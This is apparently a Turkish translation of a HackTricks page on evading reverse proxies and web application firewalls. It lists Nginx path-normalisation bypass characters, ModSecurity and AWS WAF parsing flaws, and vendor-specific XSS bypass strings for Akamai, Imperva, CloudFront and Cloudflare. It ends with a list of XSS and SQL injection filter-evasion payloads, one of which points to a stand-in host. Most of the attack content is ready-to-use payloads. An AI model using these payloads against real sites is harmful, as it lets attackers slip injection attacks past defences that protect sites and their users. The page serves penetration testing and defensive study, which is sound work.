# Proxy / WAF Koruma Aşma

{{#include ../banners/hacktricks-training.md}}


## Yolu Manipüle Ederek Nginx ACL Kurallarını Aşma <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Teknikler [bu araştırmadan](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx kural örneği:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Nginx, atlatmaları önlemek için kontrol etmeden önce yol normalizasyonu yapar. Ancak, arka uç sunucusu farklı bir normalizasyon gerçekleştirirse (nginx'in kaldırmadığı karakterleri kaldırma gibi), bu savunmayı aşmak mümkün olabilir.

### **NodeJS - Express**

| Nginx Versiyonu | **Node.js Atlatma Karakterleri** |
| --------------- | --------------------------------- |
| 1.22.0          | `\xA0`                            |
| 1.21.6          | `\xA0`                            |
| 1.20.2          | `\xA0`, `\x09`, `\x0C`            |
| 1.18.0          | `\xA0`, `\x09`, `\x0C`            |
| 1.16.1          | `\xA0`, `\x09`, `\x0C`            |

### **Flask**

| Nginx Versiyonu | **Flask Atlatma Karakterleri**                                   |
| --------------- | --------------------------------------------------------------- |
| 1.22.0          | `\x85`, `\xA0`                                                  |
| 1.21.6          | `\x85`, `\xA0`                                                  |
| 1.20.2          | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0          | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1          | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Versiyonu | **Spring Boot Atlatma Karakterleri** |
| --------------- | ------------------------------------ |
| 1.22.0          | `;`                                  |
| 1.21.6          | `;`                                  |
| 1.20.2          | `\x09`, `;`                          |
| 1.18.0          | `\x09`, `;`                          |
| 1.16.1          | `\x09`, `;`                          |

### **PHP-FPM**

Nginx FPM yapılandırması:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx, `/admin.php` erişimini engelleyecek şekilde yapılandırılmıştır, ancak bu, `/admin.php/index.php` üzerinden erişim sağlayarak aşılabilir.

### Nasıl önlenir
```plaintext
location ~* ^/admin {
deny all;
}
```
## Mod Security Kurallarını Bypass Etme <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Yol Karışıklığı

[**Bu yazıda**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) ModSecurity v3'ün (3.0.12'ye kadar) erişilen yolu (parametrelerin başlangıcına kadar) içermesi gereken `REQUEST_FILENAME` değişkenini **yanlış bir şekilde uyguladığı** açıklanmaktadır. Bunun nedeni, yolu almak için bir URL çözümlemesi yapmasıdır.\
Bu nedenle, mod security'de `http://example.com/foo%3f';alert(1);foo=` gibi bir istek, yolun sadece `/foo` olduğunu varsayacaktır çünkü `%3f` `?`'ya dönüştürülerek URL yolunu sonlandırır, ancak aslında sunucunun alacağı yol `/foo%3f';alert(1);foo=` olacaktır.

`REQUEST_BASENAME` ve `PATH_INFO` değişkenleri de bu hatadan etkilenmiştir.

Mod Security'nin 2. versiyonunda benzer bir durum meydana gelmiş ve yedek dosyalarıyla ilgili belirli uzantılara sahip dosyalara erişimi engelleyen bir korumayı aşmak mümkün olmuştur (örneğin `.bak` gibi) sadece noktayı `%2e` ile URL kodlayarak göndererek, örneğin: `https://example.com/backup%2ebak`.

## AWS WAF ACL'yi Bypass Etme <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Bozuk Başlık

[Bu araştırma](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies), AWS'nin düzgün bir şekilde ayrıştırmadığı ancak arka uç sunucusu tarafından ayrıştırılan "bozuk" bir başlık göndererek AWS WAF kurallarını HTTP başlıkları üzerinde aşmanın mümkün olduğunu belirtmektedir.

Örneğin, X-Query başlığında bir SQL enjeksiyonu ile aşağıdaki isteği göndermek:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
AWS WAF'ı atlatmak mümkündü çünkü bir sonraki satırın başlığın değeri olduğunu anlamıyordu, oysa NODEJS sunucusu bunu anlıyordu (bu düzeltildi).

## Genel WAF atlatmaları

### İstek Boyutu Sınırları

Genellikle WAF'ların kontrol etmek için belirli bir istek uzunluğu sınırı vardır ve eğer bir POST/PUT/PATCH isteği bu sınırı aşarsa, WAF isteği kontrol etmez.

- AWS WAF için [**belgelere göz atabilirsiniz**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Uygulama Yük Dengeleyici ve AWS AppSync korumaları için incelenebilecek bir web isteği gövdesinin maksimum boyutu</td><td>8 KB</td></tr><tr><td>CloudFront, API Gateway, Amazon Cognito, App Runner ve Doğrulanmış Erişim korumaları için incelenebilecek bir web isteği gövdesinin maksimum boyutu**</td><td>64 KB</td></tr></tbody></table>

- [**Azure belgelerinden**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Core Rule Set 3.1 (veya daha düşük) olan eski Web Uygulama Güvenlik Duvarları, istek gövdesi incelemesini kapatarak **128 KB**'dan büyük mesajlara izin verir, ancak bu mesajlar güvenlik açıkları için kontrol edilmeyecektir. Daha yeni sürümler (Core Rule Set 3.2 veya daha yenisi) için, maksimum istek gövdesi sınırını devre dışı bırakarak aynı şey yapılabilir. Bir istek boyut sınırını aşarsa:

Eğer **önleme modu**: İsteği kaydeder ve engeller.\
Eğer **tespit modu**: Sınır kadar inceler, geri kalanını göz ardı eder ve `Content-Length` sınırı aşarsa kaydeder.

- [**Akamai'den**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Varsayılan olarak, WAF yalnızca bir isteğin ilk 8KB'sini inceler. Gelişmiş Meta Veriler ekleyerek sınırı 128KB'a kadar artırabilir.

- [**Cloudflare'dan**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

128KB'a kadar.

### Obfuscation <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode Uyumluluğu <a href="#unicode-compatability" id="unicode-compatability"></a>

Unicode normalizasyonunun uygulanmasına bağlı olarak (daha fazla bilgi [burada](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), Unicode uyumluluğunu paylaşan karakterler WAF'ı atlayabilir ve amaçlanan yük olarak çalıştırılabilir. Uyumlu karakterler [burada](https://www.compart.com/en/unicode) bulunabilir.

#### Örnek <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### Bağlamsal WAF'ları Kodlamalarla Aşma <a href="#ip-rotation" id="ip-rotation"></a>

[**bu blog yazısında**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization) belirtildiği gibi, kullanıcı girdisinin bağlamını koruyabilen WAF'ları aşmak için WAF tekniklerini kullanıcı girdisini normalize etmek amacıyla kötüye kullanabiliriz.

Örneğin, yazıda **Akamai'nin bir kullanıcı girdisini 10 kez URL kodladığı** belirtiliyor. Bu nedenle `<input/%2525252525252525253e/onfocus` gibi bir şey Akamai tarafından `<input/>/onfocus` olarak görülecek ve **etiket kapandığı için bunun sorun olmadığını düşünebilir**. Ancak, uygulama girdiyi 10 kez URL kodlamadıkça, kurban `<input/%25252525252525253e/onfocus` gibi bir şey görecek ve bu **hala bir XSS saldırısı için geçerli**.

Bu nedenle, bu durum **WAF'ın kodlayıp yorumlayacağı, kurbanın ise göremeyeceği kodlanmış bileşenlerde yükleri gizlemeye** olanak tanır.

Ayrıca, bu sadece URL kodlu yüklerle değil, aynı zamanda unicode, hex, octal gibi diğer kodlamalarla da yapılabilir...

Yazıda aşağıdaki son aşma yöntemleri önerilmektedir:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

Ayrıca, **bazı WAF'ların kullanıcı girdisinin bağlamını nasıl anladığına** bağlı olarak bunu kötüye kullanmanın mümkün olabileceği de belirtiliyor. Blogda önerilen örnek, Akamai'nin `/*` ve `*/` arasında herhangi bir şey koymaya izin verdiğidir (muhtemelen bu, genellikle yorumlar olarak kullanıldığı için). Bu nedenle, `/*'or sleep(5)-- -*/` gibi bir SQL enjeksiyonu yakalanmayacak ve `/*` enjeksiyonun başlangıç dizesi ve `*/` yorumlandığı için geçerli olacaktır.

Bu tür bağlam sorunları, WAF tarafından istismar edilmesi beklenen **diğer zayıflıkları kötüye kullanmak için de** kullanılabilir (örneğin, bu bir XSS'i istismar etmek için de kullanılabilir).

### H2C Kaçırma <a href="#ip-rotation" id="ip-rotation"></a>

{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotasyonu <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): ffuf ile kullanılmak üzere bir API geçidi URL'si oluşturur
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): fireprox'a benzer
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): API geçidi IP'lerini kullanan Burp Suite eklentisi
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Girdi dosyası boyutuna ve bölme faktörüne dayalı olarak dinamik olarak belirlenen bir dizi konteyner örneği etkinleştirilir, girdi parçalar halinde paralel yürütme için bölünür, örneğin 10,000 satırlık bir girdi dosyasından 100 parçayı işleyen 100 örnek.
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Aşmaları

Ateş duvarlarındaki regex filtrelerini aşmak için farklı teknikler kullanılabilir. Örnekler arasında büyük/küçük harf değiştirme, satır sonları ekleme ve yükleri kodlama yer alır. Çeşitli aşmalar için kaynaklar [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) ve [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) adreslerinde bulunabilir. Aşağıdaki örnekler [bu makaleden](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2) alınmıştır.
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Araçlar

- [**nowafpls**](https://github.com/assetnote/nowafpls): WAF'ları uzunlukla atlatmak için isteklere gereksiz veri ekleyen Burp eklentisi

## Referanslar

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)


{{#include ../banners/hacktricks-training.md}}
